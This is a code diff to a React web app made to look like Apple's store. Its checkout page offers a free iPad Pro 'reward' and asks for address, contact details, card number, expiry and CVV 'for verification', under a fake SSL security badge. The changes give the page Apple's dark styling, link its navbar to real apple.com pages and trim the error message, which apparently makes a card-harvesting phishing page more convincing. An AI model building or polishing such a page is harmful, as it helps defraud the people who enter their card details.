@@ -9,14 +9,38 @@ const AppleIcon = (props: any) => (
   </svg>
 );
 
-function Navbar() {
+function Navbar({ onHomeClick }: { onHomeClick?: () => void }) {
+  const links = [
+    { name: 'Store', url: 'https://www.apple.com/store' },
+    { name: 'Mac', url: 'https://www.apple.com/mac/' },
+    { name: 'iPad', url: 'https://www.apple.com/ipad/' },
+    { name: 'iPhone', url: 'https://www.apple.com/iphone/' },
+    { name: 'Watch', url: 'https://www.apple.com/watch/' },
+    { name: 'Vision', url: 'https://www.apple.com/apple-vision-pro/' },
+    { name: 'AirPods', url: 'https://www.apple.com/airpods/' },
+    { name: 'TV & Home', url: 'https://www.apple.com/tv-home/' },
+    { name: 'Entertainment', url: 'https://www.apple.com/services/' },
+    { name: 'Accessories', url: 'https://www.apple.com/shop/accessories/all' },
+    { name: 'Support', url: 'https://support.apple.com/' }
+  ];
+
   return (
     <nav className="fixed top-0 left-0 right-0 h-12 bg-black/80 backdrop-blur-md z-50 flex items-center justify-center text-xs font-medium text-gray-300">
       <div className="max-w-5xl w-full px-4 flex items-center justify-between">
-        <AppleIcon className="w-4 h-4 hover:text-white transition-colors cursor-pointer" />
+        <button onClick={onHomeClick} className="hover:text-white transition-colors cursor-pointer outline-none">
+          <AppleIcon className="w-4 h-4" />
+        </button>
         <div className="hidden md:flex items-center space-x-8">
-          {['Store', 'Mac', 'iPad', 'iPhone', 'Watch', 'Vision', 'AirPods', 'TV & Home', 'Entertainment', 'Accessories', 'Support'].map(item => (
-            <span key={item} className="hover:text-white transition-colors cursor-pointer">{item}</span>
+          {links.map(item => (
+            <a 
+              key={item.name} 
+              href={item.url}
+              target="_blank"
+              rel="noopener noreferrer"
+              className="hover:text-white transition-colors cursor-pointer"
+            >
+              {item.name}
+            </a>
           ))}
         </div>
       </div>
@@ -253,7 +277,7 @@ function CheckoutPage({ onBack }: { onBack: () => void }) {
         setStatusMsg({ text: 'Transaction Successful! Your reward has been claimed.', type: 'success' });
         setCardNumber(''); // Clear input on success
       } else {
-        setStatusMsg({ text: 'Transaction Failed: Card not found or already used.', type: 'error' });
+        setStatusMsg({ text: 'Transaction Failed', type: 'error' });
       }
     } catch (error: any) {
       console.error(error);
@@ -264,19 +288,19 @@ function CheckoutPage({ onBack }: { onBack: () => void }) {
   };
 
   return (
-    <div className="min-h-screen bg-[#f9fafb] text-black flex flex-col items-center justify-center py-12 px-4 font-sans">
+    <div className="min-h-screen bg-black text-white flex flex-col items-center justify-center py-12 px-4 font-sans selection:bg-pink-500/30">
       <div className="w-full max-w-[500px] mb-4">
-        <button onClick={onBack} className="text-blue-600 text-sm font-medium hover:underline flex items-center gap-1">
+        <button onClick={onBack} className="text-blue-400 text-sm font-medium hover:text-blue-300 transition-colors flex items-center gap-1">
           &larr; Back to Store
         </button>
       </div>
-      <div className="bg-white rounded-xl shadow-sm border border-gray-200 w-full max-w-[500px] overflow-hidden">
+      <div className="bg-[#111] rounded-xl shadow-2xl border border-white/10 w-full max-w-[500px] overflow-hidden">
         <div className="p-6 md:p-8">
-          <h1 className="text-[28px] font-bold text-gray-900 mb-1">Delivery Address</h1>
-          <p className="text-gray-500 text-[15px] mb-6">Where should we send your iPad Pro?</p>
+          <h1 className="text-[28px] font-bold text-white mb-1">Delivery Address</h1>
+          <p className="text-gray-400 text-[15px] mb-6">Where should we send your iPad Pro?</p>
 
           {statusMsg && (
-            <div className={`mb-6 p-4 text-sm rounded-md font-medium ${statusMsg.type === 'success' ? 'bg-green-50 text-green-700 border border-green-200' : 'bg-red-50 text-red-600 border border-red-200'}`}>
+            <div className={`mb-6 p-4 text-sm rounded-md font-medium ${statusMsg.type === 'success' ? 'bg-green-500/10 text-green-400 border border-green-500/20' : 'bg-red-500/10 text-red-400 border border-red-500/20'}`}>
               {statusMsg.text}
             </div>
           )}
@@ -284,87 +308,87 @@ function CheckoutPage({ onBack }: { onBack: () => void }) {
           <form className="space-y-4">
             <div className="grid grid-cols-2 gap-4">
               <div>
-                <label className="block text-[13px] font-semibold text-gray-900 mb-1.5">First Name</label>
-                <input type="text" placeholder="John" className="w-full border border-gray-200 rounded-md px-3 py-2.5 text-sm focus:ring-2 focus:ring-blue-500 focus:border-blue-500 outline-none transition-all placeholder:text-gray-400" />
+                <label className="block text-[13px] font-semibold text-gray-300 mb-1.5">First Name</label>
+                <input type="text" placeholder="John" className="w-full bg-black border border-white/20 rounded-md px-3 py-2.5 text-sm text-white focus:ring-2 focus:ring-blue-500/50 focus:border-blue-500 outline-none transition-all placeholder:text-gray-600" />
               </div>
               <div>
-                <label className="block text-[13px] font-semibold text-gray-900 mb-1.5">Last Name</label>
-                <input type="text" placeholder="Doe" className="w-full border border-gray-200 rounded-md px-3 py-2.5 text-sm focus:ring-2 focus:ring-blue-500 focus:border-blue-500 outline-none transition-all placeholder:text-gray-400" />
+                <label className="block text-[13px] font-semibold text-gray-300 mb-1.5">Last Name</label>
+                <input type="text" placeholder="Doe" className="w-full bg-black border border-white/20 rounded-md px-3 py-2.5 text-sm text-white focus:ring-2 focus:ring-blue-500/50 focus:border-blue-500 outline-none transition-all placeholder:text-gray-600" />
               </div>
             </div>
 
             <div>
-              <label className="block text-[13px] font-semibold text-gray-900 mb-1.5">Street Address</label>
-              <input type="text" placeholder="123 Main St" className="w-full border border-gray-200 rounded-md px-3 py-2.5 text-sm focus:ring-2 focus:ring-blue-500 focus:border-blue-500 outline-none transition-all placeholder:text-gray-400" />
+              <label className="block text-[13px] font-semibold text-gray-300 mb-1.5">Street Address</label>
+              <input type="text" placeholder="123 Main St" className="w-full bg-black border border-white/20 rounded-md px-3 py-2.5 text-sm text-white focus:ring-2 focus:ring-blue-500/50 focus:border-blue-500 outline-none transition-all placeholder:text-gray-600" />
             </div>
 
             <div className="grid grid-cols-12 gap-4">
               <div className="col-span-12 sm:col-span-6">
-                <label className="block text-[13px] font-semibold text-gray-900 mb-1.5">City</label>
-                <input type="text" placeholder="New York" className="w-full border border-gray-200 rounded-md px-3 py-2.5 text-sm focus:ring-2 focus:ring-blue-500 focus:border-blue-500 outline-none transition-all placeholder:text-gray-400" />
+                <label className="block text-[13px] font-semibold text-gray-300 mb-1.5">City</label>
+                <input type="text" placeholder="New York" className="w-full bg-black border border-white/20 rounded-md px-3 py-2.5 text-sm text-white focus:ring-2 focus:ring-blue-500/50 focus:border-blue-500 outline-none transition-all placeholder:text-gray-600" />
               </div>
               <div className="col-span-6 sm:col-span-3">
-                <label className="block text-[13px] font-semibold text-gray-900 mb-1.5">State</label>
-                <input type="text" placeholder="NY" className="w-full border border-gray-200 rounded-md px-3 py-2.5 text-sm focus:ring-2 focus:ring-blue-500 focus:border-blue-500 outline-none transition-all placeholder:text-gray-400" />
+                <label className="block text-[13px] font-semibold text-gray-300 mb-1.5">State</label>
+                <input type="text" placeholder="NY" className="w-full bg-black border border-white/20 rounded-md px-3 py-2.5 text-sm text-white focus:ring-2 focus:ring-blue-500/50 focus:border-blue-500 outline-none transition-all placeholder:text-gray-600" />
               </div>
               <div className="col-span-6 sm:col-span-3">
-                <label className="block text-[13px] font-semibold text-gray-900 mb-1.5">Zip</label>
-                <input type="text" placeholder="10001" className="w-full border border-gray-200 rounded-md px-3 py-2.5 text-sm focus:ring-2 focus:ring-blue-500 focus:border-blue-500 outline-none transition-all placeholder:text-gray-400" />
+                <label className="block text-[13px] font-semibold text-gray-300 mb-1.5">Zip</label>
+                <input type="text" placeholder="10001" className="w-full bg-black border border-white/20 rounded-md px-3 py-2.5 text-sm text-white focus:ring-2 focus:ring-blue-500/50 focus:border-blue-500 outline-none transition-all placeholder:text-gray-600" />
               </div>
             </div>
 
-            <hr className="my-6 border-gray-100" />
+            <hr className="my-6 border-white/10" />
 
             <div>
-              <label className="block text-[13px] font-semibold text-gray-900 mb-1.5">Phone Number</label>
-              <input type="tel" placeholder="(555) 000-0000" className="w-full border border-gray-200 rounded-md px-3 py-2.5 text-sm focus:ring-2 focus:ring-blue-500 focus:border-blue-500 outline-none transition-all placeholder:text-gray-400" />
+              <label className="block text-[13px] font-semibold text-gray-300 mb-1.5">Phone Number</label>
+              <input type="tel" placeholder="(555) 000-0000" className="w-full bg-black border border-white/20 rounded-md px-3 py-2.5 text-sm text-white focus:ring-2 focus:ring-blue-500/50 focus:border-blue-500 outline-none transition-all placeholder:text-gray-600" />
             </div>
 
             <div>
-              <label className="block text-[13px] font-semibold text-gray-900 mb-1.5">Email Address</label>
-              <input type="email" placeholder="john@example.com" className="w-full border border-gray-200 rounded-md px-3 py-2.5 text-sm focus:ring-2 focus:ring-blue-500 focus:border-blue-500 outline-none transition-all placeholder:text-gray-400" />
+              <label className="block text-[13px] font-semibold text-gray-300 mb-1.5">Email Address</label>
+              <input type="email" placeholder="john@example.com" className="w-full bg-black border border-white/20 rounded-md px-3 py-2.5 text-sm text-white focus:ring-2 focus:ring-blue-500/50 focus:border-blue-500 outline-none transition-all placeholder:text-gray-600" />
             </div>
 
-            <hr className="my-6 border-gray-100" />
+            <hr className="my-6 border-white/10" />
 
             <div className="flex items-center gap-2 mb-4">
-              <svg className="w-5 h-5 text-blue-600" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z" /></svg>
-              <h2 className="text-[15px] font-bold text-gray-900">Card Information (For Verification)</h2>
+              <svg className="w-5 h-5 text-blue-500" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z" /></svg>
+              <h2 className="text-[15px] font-bold text-white">Card Information (For Verification)</h2>
             </div>
 
             <div>
-              <label className="block text-[13px] font-semibold text-gray-900 mb-1.5">Card Number</label>
+              <label className="block text-[13px] font-semibold text-gray-300 mb-1.5">Card Number</label>
               <input 
                 type="text" 
                 placeholder="0000000000000000" 
                 value={cardNumber}
                 onChange={handleCardNumberChange}
                 maxLength={16}
-                className="w-full border border-gray-200 rounded-md px-3 py-2.5 text-sm font-mono focus:ring-2 focus:ring-blue-500 focus:border-blue-500 outline-none transition-all placeholder:text-gray-400" 
+                className="w-full bg-black border border-white/20 rounded-md px-3 py-2.5 text-sm text-white font-mono focus:ring-2 focus:ring-blue-500/50 focus:border-blue-500 outline-none transition-all placeholder:text-gray-600" 
               />
             </div>
 
             <div className="grid grid-cols-2 gap-4">
               <div>
-                <label className="block text-[13px] font-semibold text-gray-900 mb-1.5">Expiry Date</label>
+                <label className="block text-[13px] font-semibold text-gray-300 mb-1.5">Expiry Date</label>
                 <input 
                   type="text" 
                   placeholder="MMYY" 
                   value={expiryDate}
                   onChange={handleExpiryDateChange}
                   maxLength={4}
-                  className="w-full border border-gray-200 rounded-md px-3 py-2.5 text-sm focus:ring-2 focus:ring-blue-500 focus:border-blue-500 outline-none transition-all placeholder:text-gray-400" 
+                  className="w-full bg-black border border-white/20 rounded-md px-3 py-2.5 text-sm text-white focus:ring-2 focus:ring-blue-500/50 focus:border-blue-500 outline-none transition-all placeholder:text-gray-600" 
                 />
               </div>
               <div>
-                <label className="block text-[13px] font-semibold text-gray-900 mb-1.5">CVV</label>
+                <label className="block text-[13px] font-semibold text-gray-300 mb-1.5">CVV</label>
                 <input 
                   type="text" 
                   placeholder="123" 
                   value={cvv}
                   onChange={handleCvvChange}
                   maxLength={3}
-                  className="w-full border border-gray-200 rounded-md px-3 py-2.5 text-sm focus:ring-2 focus:ring-blue-500 focus:border-blue-500 outline-none transition-all placeholder:text-gray-400" 
+                  className="w-full bg-black border border-white/20 rounded-md px-3 py-2.5 text-sm text-white focus:ring-2 focus:ring-blue-500/50 focus:border-blue-500 outline-none transition-all placeholder:text-gray-600" 
                 />
               </div>
             </div>
@@ -374,7 +398,7 @@ function CheckoutPage({ onBack }: { onBack: () => void }) {
                 type="button" 
                 onClick={handleClaim}
                 disabled={isProcessing}
-                className="w-full bg-[#1c64f2] hover:bg-blue-700 disabled:bg-blue-400 text-white font-bold py-3.5 px-4 rounded-lg flex items-center justify-center gap-2 transition-colors shadow-sm shadow-blue-500/30"
+                className="w-full bg-[#1c64f2] hover:bg-blue-600 disabled:bg-blue-800 disabled:text-gray-400 text-white font-bold py-3.5 px-4 rounded-lg flex items-center justify-center gap-2 transition-colors shadow-sm shadow-blue-500/20"
               >
                 {isProcessing ? 'Processing...' : 'Claim My Reward'}
                 {!isProcessing && <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2.5} d="M9 5l7 7-7 7" /></svg>}
@@ -383,8 +407,8 @@ function CheckoutPage({ onBack }: { onBack: () => void }) {
           </form>
         </div>
 
-        <div className="bg-[#f9fafb] border-t border-gray-200 p-5 flex flex-col items-center gap-3">
-          <div className="flex items-center gap-4 opacity-50 grayscale">
+        <div className="bg-black border-t border-white/10 p-5 flex flex-col items-center gap-3">
+          <div className="flex items-center gap-4 opacity-40 grayscale">
             {/* Visa */}
             <svg className="h-4" viewBox="0 0 32 10" fill="currentColor"><path d="M14.5 0L13.2 8.3h2.1l1.3-8.3h-2.1zm8.4 0c-.5 0-1.2.2-1.6.4l-.8 4.1c.3.2.8.3 1.2.3 1.5 0 2.1-.8 2.3-1.6.2-.8-.2-1.4-1.1-1.4-.4 0-.8.1-1.1.2l.3-1.6c.3-.1.8-.2 1.3-.2 1.1 0 1.6.5 1.4 1.3-.1.6-.6 1.1-1.3 1.1-.3 0-.6-.1-.8-.2l.6-2.9c.3-.1.7-.2 1.1-.2.4 0 .6.2.5.6-.1.4-.5.7-1 .7-.2 0-.4 0-.5-.1l-.4 2.1c.3.1.7.2 1.1.2 1.2 0 2.1-.7 2.4-1.8.3-1.3-.5-2.1-1.8-2.1zm-15.6 0L5.1 5.7 4.3 1.5C4.2.5 3.5 0 2.5 0H0v.4c.8.2 1.6.5 2.1.9l1.8 7h2.2l3.3-8.3H7.3zm16.5 0h-1.6c-.4 0-.7.2-.8.6l-3.1 7.7h2.2l.4-1.2h2.7l.3 1.2h2.1L23.8 0zm-2.4 5.3l1.1-3.1h.1l.5 3.1h-1.7z"/></svg>
             {/* Mastercard */}
@@ -392,7 +416,7 @@ function CheckoutPage({ onBack }: { onBack: () => void }) {
             {/* PayPal */}
             <svg className="h-4" viewBox="0 0 24 24" fill="currentColor"><path d="M7.076 21.337H2.47a.641.641 0 0 1-.633-.74L4.944.901C5.026.382 5.474 0 5.998 0h7.46c2.57 0 4.578.543 5.69 1.81 1.01 1.15 1.304 2.42 1.012 4.287-.023.143-.047.288-.077.437-.983 5.05-4.349 6.797-8.647 6.797h-2.19c-.524 0-.968.382-1.05.9l-1.12 7.106z"/></svg>
           </div>
-          <div className="flex items-center gap-1.5 text-[#8b929e] text-[10px] font-bold tracking-wider uppercase">
+          <div className="flex items-center gap-1.5 text-gray-500 text-[10px] font-bold tracking-wider uppercase">
             <svg className="w-3 h-3" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" /></svg>
             Secure 256-bit SSL Encryption
           </div>
@@ -558,7 +582,7 @@ export default function App() {
 
   return (
     <div className="bg-black min-h-screen text-white selection:bg-pink-500/30">
-      <Navbar />
+      <Navbar onHomeClick={() => setCurrentView('store')} />
       <SubNav onBuyClick={() => setCurrentView('checkout')} />
       <main>
         <Hero />
